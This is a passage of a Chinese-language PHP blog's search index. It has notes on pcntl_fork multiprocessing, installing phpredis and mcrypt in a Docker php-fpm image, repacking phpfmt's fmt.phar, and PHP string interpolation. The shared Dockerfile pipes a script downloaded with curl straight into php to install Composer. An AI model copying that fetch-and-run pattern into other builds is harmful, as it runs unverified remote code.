多程序小記","url":"/blog/2019/11/21/php-pcntl-fork-%E5%A4%9A%E7%A8%8B%E5%BA%8F%E5%B0%8F%E8%A8%98/","content":"<p>之前在 swoole 有簡單紀錄 pcntl_fork<br>我在寫那篇之前，以為 pcntl_fork 執行子程序大概不會收到執行結果<br>不過今天仔細看，可以接收到程式執行結果<br>但還是不能傳接收參數值</p>\n<a id=\"more\"></a>\n<h2 id=\"簡單範例\"><a href=\"#簡單範例\" class=\"headerlink\" title=\"簡單範例\"></a>簡單範例</h2><p><a href=\"http://pkwbim-programming-note.blogspot.com/2008/01/phpmulti-process-1.html\" target=\"_blank\" rel=\"noopener\">多采多姿的程式筆記: 利用PHP寫Multi Process程式 1 - 產生子程序</a><br>基本上裡面範例可以直接拿來改<br>建議先了解 fork 子程序概念會是最好</p>\n<p><a href=\"http://pkwbim-programming-note.blogspot.com/2008/01/phpmulti-process-2.html\" target=\"_blank\" rel=\"noopener\">多采多姿的程式筆記: 利用PHP用寫Multi Process程式 - 2 使用信號機</a><br>ftok  swoole 裡面有 Message Quene 有提到</p>\n<h2 id=\"pcntl-wait、pcntl-waitpid\"><a href=\"#pcntl-wait、pcntl-waitpid\" class=\"headerlink\" title=\"pcntl_wait、pcntl_waitpid\"></a>pcntl_wait、pcntl_waitpid</h2><p><a href=\"https://www.cnblogs.com/leezhxing/p/5223289.html\" target=\"_blank\" rel=\"noopener\">php多进程总结 - leezhxing - 博客园</a><a href=\"/blog/2019/11/21/php-pcntl-fork-多程序小記/web2.png\" title=\"備份圖\">備份圖</a></p>\n<p>裡面也有提 殭屍程序</p>\n<p><a href=\"http://blog.jangmt.com/2015/02/php-multi-process-ping.html\" target=\"_blank\" rel=\"noopener\">八克里: PHP Multi Process 程式以 PING 多主機應用為範例</a><br>備份<a href=\"https://github.com/malagege/mylinux_document/blob/master/ping.php\" target=\"_blank\" rel=\"noopener\">mylinux_document/ping.php at master · malagege/mylinux_document</a></p>\n<h2 id=\"DB-連線問題\"><a href=\"#DB-連線問題\" class=\"headerlink\" title=\"DB 連線問題\"></a>DB 連線問題</h2><p>目前有簡單實驗，父子 DB 連線是可以共用的<br>但不建議這樣做，同時在跑的程式結果有做 交易(translation) 就很麻煩<br>所以還是分開來會比較好<br><a href=\"https://www.cnblogs.com/AllenChou/p/6607182.html\" target=\"_blank\" rel=\"noopener\">pcntl_fork 導致 MySQL server has gone away 解決方案 - AllenChou - 博客園</a> <a href=\"/blog/2019/11/21/php-pcntl-fork-多程序小記/web3.png\" title=\"備份圖\">備份圖</a></p>\n<p><strong>2019-12-04</strong><br>建議做 fork 時候最好先把連線關掉<br>完成重新做連線會比較好<br>否則會預到很多問題</p>\n<h2 id=\"Daemon\"><a href=\"#Daemon\" class=\"headerlink\" title=\"Daemon\"></a>Daemon</h2><p><a href=\"https://anyof.me/articles/489\" target=\"_blank\" rel=\"noopener\">PHP实现daemon | Nginlion</a> <a href=\"/blog/2019/11/21/php-pcntl-fork-多程序小記/web4.png\" title=\"備份圖\">備份圖</a><br><a href=\"http://wsfdl.com/linux/2015/10/18/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AAdaemon.html\" target=\"_blank\" rel=\"noopener\">如何优雅地运行一个 Daemon</a><br><a href=\"https://sunzy.me/2017/09/php-multi-process/\" target=\"_blank\" rel=\"noopener\">PHP多进程编程 | 第二世</a> <a href=\"/blog/2019/11/21/php-pcntl-fork-多程序小記/web5.png\" title=\"備份圖\">備份圖</a></p>\n<h3 id=\"彩蛋\"><a href=\"#彩蛋\" class=\"headerlink\" title=\"彩蛋\"></a>彩蛋</h3><p><a href=\"https://github.com/shaneharter/PHP-Daemon\" target=\"_blank\" rel=\"noopener\">shaneharter/PHP-Daemon: Build production-ready Daemons using PHP 5.3+. Build fault-tolerant applications without the boilerplate.</a><br><a href=\"https://www.cnblogs.com/kerrycode/p/3595724.html\" target=\"_blank\" rel=\"noopener\">深入理解Linux修改hostname - 潇湘隐者 - 博客园</a><br><a href=\"https://blog.gtwang.org/programming/bash-tutorial-parallel-subprocesses-and-wait/\" target=\"_blank\" rel=\"noopener\">Bash 程式設計教學：平行執行背景子行程，用 wait 等待工作結束 - G. T. Wang</a></p>\n","categories":["PHP"],"tags":["php"]},{"title":"php7安裝phpredis和mcrypt在docker方法","url":"/blog/2019/04/10/php7%E5%AE%89%E8%A3%9Dphpredis%E5%92%8Cmcrypt%E5%9C%A8docker%E6%96%B9%E6%B3%95/","content":"<p>最近有專案需要用到 phpredis,mcrypt<br>所以 php-fpm 需要安裝套件<br>有 google 找到方法<br>這邊簡單筆記</p>\n<a id=\"more\"></a>\n<h2 id=\"phpredis\"><a href=\"#phpredis\" class=\"headerlink\" title=\"phpredis\"></a>phpredis</h2><p>phpredis 安裝很順利<br><code>RUN pecl install redis &amp;&amp; docker-php-ext-enable redis</code></p>\n<h2 id=\"mcrypt\"><a href=\"#mcrypt\" class=\"headerlink\" title=\"mcrypt\"></a>mcrypt</h2><p>在 PHP7.0 好像就不能使用，所以需要手動安裝</p>\n<p>網路上看到</p>\n<blockquote>\n<p>PHP mcrypt extension 的安裝步驟</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; sudo apt install re2c php7.2-dev libmcrypt-dev # php7.2-dev for phpize</span><br><span class=\"line\">&gt; sudo pecl install mcrypt-1.0.1 # 產生在 /usr/lib/php/20170718/mcrypt.so</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>PHP mcrypt 的設定步驟</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; sudo vim /etc/php/7.2/mods-available/mcrypt.ini</span><br><span class=\"line\">&gt; extension=mcrypt.so</span><br><span class=\"line\">&gt; sudo phpenmod mcrypt</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>重新啟動 php / cgi / web 即可</p>\n</blockquote>\n<p>這邊這一行<code>pecl install mcrypt-1.0.1</code>我在 php7.3 安裝不行<br><a href=\"https://pecl.php.net/package/mcrypt\" target=\"_blank\" rel=\"noopener\">PECL :: Package :: mcrypt</a><br>不過看到 mcrypt 也有持續在更新，所以只要抓最新版 1.0.2 就可以安裝</p>\n<p>這時候可以在 phpinfo 裡面看有沒有正常安裝</p>\n<p>分享 Dockerfile</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> php:<span class=\"number\">7.3</span>-fpm</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"bash\"> apt-get update -y &amp;&amp; apt-get install -y openssl zip unzip git libmcrypt-dev</span></span><br><span class=\"line\"><span class=\"bash\">RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/<span class=\"built_in\">local</span>/bin --filename=composer</span></span><br><span class=\"line\"><span class=\"bash\">RUN docker-php-ext-install opcache bcmath pdo_mysql mysqli</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">RUN pecl install redis &amp;&amp; docker-php-ext-enable redis</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">RUN pecl install mcrypt-1.0.2 &amp;&amp; docker-php-ext-enable mcrypt</span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\">ARG DIR</span></span><br><span class=\"line\"><span class=\"bash\">WORKDIR <span class=\"variable\">$DIR</span></span></span><br><span class=\"line\"><span class=\"bash\"></span></span><br><span class=\"line\"><span class=\"bash\"> RUN composer install</span></span><br></pre></td></tr></table></figure>\n<p>好奇 docker-php-ext-enable 有做什麼，所以有查了一下</p>\n<h2 id=\"docker-php-ext-install\"><a href=\"#docker-php-ext-install\" class=\"headerlink\" title=\"docker-php-ext-install\"></a>docker-php-ext-install</h2><p>簡單來講就是安裝 PHP 內建現有套件</p>\n<blockquote>\n<p>php 目录下还准备好了 php 配置文件 php.ini 以及 php-fpm.conf，基础镜像我们选择的是 PHP 5.6-FPM，这同样是一个 Debian Jessie 镜像。官方比较亲切的在镜像内部准备了一个 docker-php-ext-install 指令，可以快速安装如 GD、PDO 等常用扩展。所有支持的扩展名称可以通过在容器内运行 docker-php-ext-install 获得。</p>\n</blockquote>\n<p><a href=\"http://dockone.io/article/481\" target=\"_blank\" rel=\"noopener\">Docker 在 PHP 项目开发环境中的应用 - DockOne.io</a><br><a href=\"https://gist.github.com/giansalex/2776a4206666d940d014792ab4700d80\" target=\"_blank\" rel=\"noopener\">docker-php-ext-install Reference</a></p>\n<h2 id=\"docker-php-ext-enable\"><a href=\"#docker-php-ext-enable\" class=\"headerlink\" title=\"docker-php-ext-enable\"></a>docker-php-ext-enable</h2><p>原本我在<a href=\"https://segmentfault.com/q/1010000017449567\" target=\"_blank\" rel=\"noopener\">php7 - docker-php-ext-enable 的原理？ - SegmentFault 思否</a>看不是很懂<br>後來<a href=\"https://huanghantao.github.io/2018/12/21/docker-php-ext-enable%E5%8F%AF%E4%BB%A5%E5%BC%80%E5%90%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8E%9F%E7%90%86/\" target=\"_blank\" rel=\"noopener\">docker-php-ext-enable 可以開啟擴展的原理 | 一顆西瓜籽</a>這篇看懂</p>\n<blockquote>\n<p>開啟擴展的那一行是寫在文件/usr/local/etc/php/conf.d/docker-php-ext-擴展名.ini 這個配置文件裡面的。查看命令 php -i 的輸出 … 煥然大悟。</p>\n</blockquote>\n<p>看著這篇「恍然大悟」，我也跟者恍然大悟 XD</p>\n<p><a href=\"https://huanghantao.github.io/2018/12/21/docker-php-ext-enable%E5%8F%AF%E4%BB%A5%E5%BC%80%E5%90%AF%E6%89%A9%E5%B1%95%E7%9A%84%E5%8E%9F%E7%90%86/\" target=\"_blank\" rel=\"noopener\">docker-php-ext-enable 可以开启扩展的原理 | 一颗西瓜籽</a></p>\n<p>最後<a href=\"https://xieye.iteye.com/blog/802509\" target=\"_blank\" rel=\"noopener\">windows 下 php 无法使用 mcrypt 的解决 - xieye - ITeye 博客</a>，因為不知道 window 要怎麼安裝 mcrypt<br>剛好有翻到這篇，不過我沒有嘗試。</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/31369867/how-to-install-php-redis-extension-using-the-official-php-docker-image-approach\" target=\"_blank\" rel=\"noopener\">How to install php-redis extension using the official PHP Docker image approach? - Stack Overflow</a></li>\n<li><a href=\"https://lukasmestan.com/install-mcrypt-extension-in-php7-2/\" target=\"_blank\" rel=\"noopener\">How to install mcrypt in php7.2 / php7.3 | Lukáš Mešťan</a></li>\n<li><a href=\"https://github.com/docker-library/php/issues/541\" target=\"_blank\" rel=\"noopener\">docker php7.2 not installing mcrypt · Issue #541 · docker-library/php</a></li>\n<li><a href=\"https://xieye.iteye.com/blog/802509\" target=\"_blank\" rel=\"noopener\">windows 下 php 无法使用 mcrypt 的解决 - xieye - ITeye 博客</a></li>\n<li><a href=\"https://www.jianshu.com/p/ad88f1b8b2df\" target=\"_blank\" rel=\"noopener\">php7.1 加密解密 openssl_encrypt 替代 mcrypt - 简书</a></li>\n</ul>\n<p>最近看到有人分享 phpenv.cn<br>發現裡面有整合 nginx 和 redis<br>為什麼會寫在這邊呢 怕忘記寫…</p>\n","categories":["PHP"],"tags":["php","phpredis","mcrypt"]},{"title":"phpfmt把true,false,null存檔變大寫(違反psr2)，解出/打包phar","url":"/blog/2018/07/18/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%EF%BC%8C%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/","content":"<p>由於目前公司開發團隊，有自訂PHP程式風格<br>但是規則跟PSR規則不太一樣<br>其中一個就是要true,false要大寫(drupal規範好像是要大寫)<br>平常我也都小寫orz<br>不知道當初訂製這個規則是不是有開發過drupal<br>最近使用phpfmt一直在找解決這個問題(常常忘記大寫orz)<br>最後研究出來，當然一定要筆記一下<br>有需要可能可以參考這篇<br>應該沒有什麼人需要吧 呵呵</p>\n<a id=\"more\"></a>\n<p>找出phpfmt路徑<br><code>%USERPROFILE%\\.vscode\\extensions</code></p>\n<p>進入phpfmt路徑(可搜尋phpfmt)<br>裡面有<code>fmt.phar</code>檔案</p>\n<p>phar是類似php多隻程式打包成一個檔案，有一點跟jar一樣<br>但怎麼不能用zip打開orz<br>不過說真的打包過程很麻煩樣子<br>composer也不能直接做phar(可能沒有找到)<br>最後有Google到方法</p>\n<h3 id=\"解出phar\"><a href=\"#解出phar\" class=\"headerlink\" title=\"解出phar\"></a>解出phar</h3><p><a href=\"https://blog.csdn.net/u011474028/article/details/54973571\" target=\"_blank\" rel=\"noopener\">php归档格式：phar文件详解（创建、使用、解包还原提取） - CSDN博客</a><br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$phar = <span class=\"keyword\">new</span> Phar(<span class=\"string\">'fmt.phar'</span>);</span><br><span class=\"line\">$phar-&gt;extractTo(<span class=\"string\">'fmt'</span>); <span class=\"comment\">//提取一份原項目文件</span></span><br><span class=\"line\">$phar-&gt;convertToData(Phar::ZIP); <span class=\"comment\">//另外再提取一份，和上行二選一即可</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"打包phar\"><a href=\"#打包phar\" class=\"headerlink\" title=\"打包phar\"></a>打包phar</h3><p>參考<a href=\"https://it.mlc.edu.tw/index.php/2012-03-24-08-48-16/2012-03-24-08-49-32/27-php/54-php-phar\" target=\"_blank\" rel=\"noopener\">苗栗縣教育處資訊教育中心 - 打包多個php檔案變成phar執行檔</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$p=<span class=\"keyword\">new</span> Phar(<span class=\"string\">'./fmt.phar'</span>);</span><br><span class=\"line\">$p-&gt;setStub(file_get_contents(<span class=\"string\">'fmt.stub.php'</span>));<span class=\"comment\">//入口網頁</span></span><br><span class=\"line\">$p-&gt;buildFromDirectory(<span class=\"string\">'.'</span>);<span class=\"comment\">//不確定要有</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"無法解出phar問題\"><a href=\"#無法解出phar問題\" class=\"headerlink\" title=\"無法解出phar問題\"></a>無法解出phar問題</h3><p>因為在公司不知道為什麼?phar一直失敗</p>\n<ul>\n<li>注意資料夾是不是唯讀</li>\n<li>確定php.ini有沒有把phar.readonly = Off</li>\n<li>phar.readonly前面有沒有把; del掉(我就是卡在這邊orz)</li>\n</ul>\n<p>要怎麼知道command line 的php.ini是吃哪裡?預設應該是php目錄裡面（PS:phpfmt是對應OS環境變數path裡面php)<br><a href=\"https://stackoverflow.com/questions/2750580/how-to-find-the-php-ini-file-used-by-the-command-line\" target=\"_blank\" rel=\"noopener\">easyphp - How to find the php.ini file used by the command line? - Stack Overflow</a><br><code>php -i</code>可以看裡面設定內容，可以看到phar.readonly有沒有關閉才能正確執行</p>\n<p>phar參考連結</p>\n<ul>\n<li><a href=\"https://github.com/akalongman/fmt\" target=\"_blank\" rel=\"noopener\">akalongman/fmt: Tooling for PHP - testing, code coverage and formatting</a></li>\n<li><a href=\"https://newsn.net/say/php-phar-extract.html\" target=\"_blank\" rel=\"noopener\">如何解包还原一个phar文件</a></li>\n<li><a href=\"http://www.cnblogs.com/CraryPrimitiveMan/p/6158196.html\" target=\"_blank\" rel=\"noopener\">PHP的学习–使用phar打包 - 疯狂的原始人 - 博客园</a></li>\n<li><a href=\"https://it.mlc.edu.tw/index.php/2012-03-24-08-48-16/2012-03-24-08-49-32/27-php/54-php-phar\" target=\"_blank\" rel=\"noopener\">苗栗縣教育處資訊教育中心 - 打包多個php檔案變成phar執行檔</a></li>\n<li><a href=\"https://stackoverflow.com/questions/2750580/how-to-find-the-php-ini-file-used-by-the-command-line\" target=\"_blank\" rel=\"noopener\">easyphp - How to find the php.ini file used by the command line? - Stack Overflow</a></li>\n<li><a href=\"https://scar.tw/article/2013/01/09/php-phar-create-and-use/\" target=\"_blank\" rel=\"noopener\">Phar建立與使用 | ScarShow | 刀疤說</a></li>\n</ul>\n<p>修改完成<br><img src=\"/blog/2018/07/18/phpfmt把true-false-null存檔變大寫-違反psr2-，解出-打包phar/fmt.gif\" title=\"vscode結果\"></p>\n<p>最後修改完php<br>做上面打包動作<br>覆蓋fmt.phar，即可完成<br>fmt_smt.php修改部分<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">         <span class=\"keyword\">if</span> (<span class=\"string\">'true'</span> === $lcText || <span class=\"string\">'false'</span> === $lcText || <span class=\"string\">'null'</span> === $lcText) &#123;</span><br><span class=\"line\">             $lcText = strtoupper($text);</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (</span><br><span class=\"line\">\t(</span><br><span class=\"line\">\t\t(<span class=\"string\">'TRUE'</span> === $lcText || <span class=\"string\">'FALSE'</span> === $lcText || <span class=\"string\">'NULL'</span> === $lcText) &amp;&amp;</span><br><span class=\"line\">\t\t!<span class=\"keyword\">$this</span>-&gt;leftUsefulTokenIs([</span><br></pre></td></tr></table></figure></p>\n<p>很麻煩的話，可以下載我改過的:D<br>打包完的phar檔案需要的話可以自取<br><a href=\"/blog/2018/07/18/phpfmt把true-false-null存檔變大寫-違反psr2-，解出-打包phar/fmt.phar\" title=\"fmt.phar下載\">fmt.phar下載</a></p>\n<p>最後設定檔下面可以拿掉<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;phpfmt.psr2&quot;: false,</span><br></pre></td></tr></table></figure></p>\n<p>不過psr2除了小寫，不知道還有做什麼事情= =a</p>\n","categories":["實用工具"],"tags":["php","vscode","phpfmt","psr2","phar"]},{"title":"php字串\"符號帶變數用法","url":"/blog/2018/07/04/php%E5%AD%97%E4%B8%B2%E7%AC%A6%E8%99%9F%E5%B8%B6%E8%AE%8A%E6%95%B8%E7%94%A8%E6%B3%95/","content":"<p>高職我第一翻開的書是PHP<br>從以前我就知道’&amp;”在PHP的差別<br>但我沒有深入了解…..<br>今天踩到一個雷<br><code>A PHP Error was encountered Severity: Notice Message: Undefined variable: date</code><br>我發現我字串這樣寫<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$date = date(<span class=\"string\">\"Y-m-d\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$date之後要做什麼\"</span>;</span><br></pre></td></tr></table></figure></p>\n<p>其實後來發現$date後面要空白，不能連在一起<br>同一個雷，不希望一直踩到<br>就筆記筆記吧</p>\n<a id=\"more\"></a>\n<p>下面是官網範例，簡單講””包起來遇到$就會抓取變數<br>不管是陣列還是物件都可以抓到<br>但注意$var後面字串要分格空白<br><strong>當然也可以用{}包起來，但要相連在一起</strong><br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 顯示所有錯誤</span></span><br><span class=\"line\">error_reporting(E_ALL);</span><br><span class=\"line\"></span><br><span class=\"line\">$great = <span class=\"string\">'fantastic'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 無效，輸出: This is &#123; fantastic&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is &#123; $great&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效，輸出： This is fantastic</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is &#123;$great&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is $&#123;great&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This square is &#123;$square-&gt;width&#125;00 centimeters broad.\"</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">$juices = <span class=\"keyword\">array</span>(<span class=\"string\">\"apple\"</span>, <span class=\"string\">\"orange\"</span>, <span class=\"string\">\"koolaid1\"</span> =&gt; <span class=\"string\">\"purple\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"He drank some $juices[0] juice.\"</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"He drank some $juices[1] juice.\"</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"He drank some juice made of $juice[0]s.\"</span>.PHP_EOL; <span class=\"comment\">// Won't work</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"He drank some $juices[koolaid1] juice.\"</span>.PHP_EOL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">people</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $john = <span class=\"string\">\"John Smith\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $jane = <span class=\"string\">\"Jane Smith\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $robert = <span class=\"string\">\"Robert Paulsen\"</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> $smith = <span class=\"string\">\"Smith\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$people = <span class=\"keyword\">new</span> people();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$people-&gt;john drank some $juices[0] juice.\"</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$people-&gt;john then said hello to $people-&gt;jane.\"</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$people-&gt;john's wife greeted $people-&gt;robert.\"</span>.PHP_EOL;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$people-&gt;robert greeted the two $people-&gt;smiths.\"</span>; <span class=\"comment\">// Won't work  多加s   害我一直再看哪裡有問題orz</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * 下面特殊狀況</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> */</span> </span><br><span class=\"line\"> <span class=\"comment\">//有效</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This square is &#123;$square-&gt;width&#125;00 centimeters broad.\"</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效，只有通過花括號語法才能正確解析帶引號的鍵名</span></span><br><span class=\"line\"><span class=\"comment\">// 這個雷我可能還不知道</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This works: &#123;$arr['key']&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This works: &#123;$arr[4][3]&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//沒有帶key的字串可以不用&#123;&#125; ex:$arr[4][3]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 這是錯誤的表達式，因為就像 $foo[bar] 的格式在字符串以外也是錯的一樣。</span></span><br><span class=\"line\"><span class=\"comment\">// 換句話說，只有在 PHP 能找到常量 foo 的前提下才會正常工作；這裡會產生一個</span></span><br><span class=\"line\"><span class=\"comment\">// E_NOTICE (undefined constant) 級別的錯誤。</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is wrong: &#123;$arr[foo][3]&#125;\"</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效，當在字符串中使用多重數組時，一定要用括號將它括起來</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This works: &#123;$arr['foo'][3]&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This works: \"</span> . $arr[<span class=\"string\">'foo'</span>][<span class=\"number\">3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This works too: &#123;$obj-&gt;values[3]-&gt;name&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 下面很神奇，可以用function return 字串出來，但不能直接用function回傳字串</span></span><br><span class=\"line\"><span class=\"comment\"> * 感覺不是很實用...</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is the value of the var named $name: &#123;$&#123;$name&#125;&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is the value of the var named by the return value of getName(): &#123;$&#123;getName()&#125;&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is the value of the var named by the return value of \\$object-&gt;getName(): &#123;$&#123;$object-&gt;getName()&#125;&#125;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 無效，輸出： This is the return value of getName(): &#123;getName()&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"This is the return value of getName(): &#123;getName()&#125;\"</span>;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>函數、方法、靜態類變量和類常量只有在 PHP 5 以後才可在 {$} 中使用。然而，只有在該字符串被定義的命名空間中才可以將其值作為變量名來訪問。只單一使用花括號 ({}) 無法處理從函數或方法的返回值或者類常量以及類靜態變量的值。<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 顯示所有錯誤</span></span><br><span class=\"line\">error_reporting(E_ALL);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">beers</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> softdrink = <span class=\"string\">'rootbeer'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> $ale = <span class=\"string\">'ipa'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$rootbeer = <span class=\"string\">'A &amp; W'</span>;</span><br><span class=\"line\">$ipa = <span class=\"string\">'Alexander Keith\\'s'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 有效，輸出： I'd like an A &amp; W</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"I'd like an &#123;$&#123;beers::softdrink&#125;&#125;\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 也有效，輸出： I'd like an Alexander Keith's</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"I'd like an &#123;$&#123;beers::$ale&#125;&#125;\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<p>以前我記得PHP有一個HEREDOC<br>但剛剛看文件5.3以後有一個NOWDOC</p>\n<p> heredoc 語法結構<br>nowdoc 語法結構（自 PHP 5.3.0 起） </p>\n<p>heredoc可以用$var 帶變數<br>但是nowdoc不會帶入$var變數<br>nowdoc用在XML會比較不會有問題</p>\n<p>官網範例<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$str = <span class=\"string\">&lt;&lt;&lt;'EOD'</span></span><br><span class=\"line\"><span class=\"string\">Example of string</span></span><br><span class=\"line\"><span class=\"string\">spanning multiple lines</span></span><br><span class=\"line\"><span class=\"string\">using nowdoc syntax.</span></span><br><span class=\"line\"><span class=\"string\">EOD;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 含有变量的更复杂的示例 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">foo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $foo;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $bar;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;foo = <span 